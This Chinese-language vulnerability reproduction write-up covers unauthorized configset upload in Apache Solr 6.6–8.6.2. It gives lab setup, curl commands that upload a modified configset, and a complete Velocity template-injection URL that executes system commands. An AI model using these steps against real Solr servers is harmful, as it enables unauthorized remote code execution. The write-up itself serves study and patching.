**0x00简介**

Solr 是一个开源的企业级搜索服务器，底层使用易于扩展和修改的Java 来实现。服务器通信使用标准的HTTP 和XML，所以如果使用Solr 了解Java
技术会有用却不是必须的要求。

Solr 主要特性有：强大的全文检索功能，高亮显示检索结果，动态集群，数据库接口和电子文档（Word ，PDF 等）的处理。而且Solr
具有高度的可扩展，支持分布搜索和索引的复制。

![](https://image.3001.net/images/20201113/1605273303_5fae86d731791fac1e78e.jpg!small)

 **0x01漏洞概述**

Apache Solr 发布公告，旧版本的 ConfigSet API 中存在未授权上传漏洞风险，被利用可能导致 RCE(远程代码执行)。

 **0x02影响版本**

Apache Solr 6.6.0 -6.6.5

Apache Solr 7.0.0 -7.7.3

Apache Solr 8.0.0 -8.6.2

 **0x03环境搭建**

1.本次测试环境为solr7.0.1下载地址如下：

https://archive.apache.org/dist/lucene/solr/7.0.1/

![](https://image.3001.net/images/20201113/1605273310_5fae86dec259d9108c460.jpg!small)

2\. 进入solr-7.7.0/bin目录下，使用 ./solr start -e cloud -force启动一个cloud示例，默认安装即可。

./solr start -e cloud -force

![](https://image.3001.net/images/20201113/1605273317_5fae86e561ca80d0a8903.jpg!small)

显示到这一步表示安装完成

![](https://image.3001.net/images/20201113/1605273324_5fae86ec573db6715b1cf.jpg!small)

在浏览器输入http://127.0.0.1:8983/

![](https://image.3001.net/images/20201113/1605273331_5fae86f3260603797286a.jpg!small)

 **0x04漏洞利用**

  1. 进入到/solr-7.0.1/server/solr/configsets/sample_techproducts_configs/conf 目录。
  2. 下修改solrconfig.xml如下内容：输入wq或x保存

原配置内容：

<queryResponseWriter name="velocity" class="solr.VelocityResponseWriter"
startup="lazy">

<str name="template.base.dir">${velocity.template.base.dir:}</str>

</queryResponseWriter>  
  
---  
  
修改后：

<queryResponseWriter name="velocity" class="solr.VelocityResponseWriter"
startup="lazy">

<str name="template.base.dir">${velocity.template.base.dir:}</str>

<str
name="solr.resource.loader.enabled">${velocity.solr.resource.loader.enabled:true}</str>

<str
name="params.resource.loader.enabled">${velocity.params.resource.loader.enabled:true}</str>

</queryResponseWriter>  
  
---  
  
![](https://image.3001.net/images/20201113/1605273338_5fae86fad911f926677b5.jpg!small)

3.然后执行zip -r - * > mytest.zip

![](https://image.3001.net/images/20201113/1605273346_5fae87021a1b482a08c02.jpg!small)

![](https://image.3001.net/images/20201113/1605273352_5fae8708b677aec58da65.jpg!small)

4.然后接着执行curl -X POST --header "Content-Type:application/octet-stream" --data-binary @mytest.zip
"http://localhost:8983/solr/admin/configs?action=UPLOAD&name=mytest"

![](https://image.3001.net/images/20201113/1605273362_5fae8712933e3dd6cd8fb.jpg!small)

5\. 然后接着执行curl
"http://localhost:8983/solr/admin/collections?action=CREATE&name=mytest2&numShards=1&replicationFactor=1&wt=xml&collection.configName=mytest"

![](https://image.3001.net/images/20201113/1605273369_5fae871952296325c96f0.jpg!small)

6\. 到这里可以看到已经上传上去名为mytest2的Collection。现在就可以使用漏洞执行RCE。

http://ip:8983/solr/mytest2/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27pwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end

![](https://image.3001.net/images/20201113/1605273395_5fae8733344fc104478bf.jpg!small)

 **0x05修复建议**

升级solr到最新版本

参考连接: https://blog.csdn.net/qq_40989258/article/details/109121350

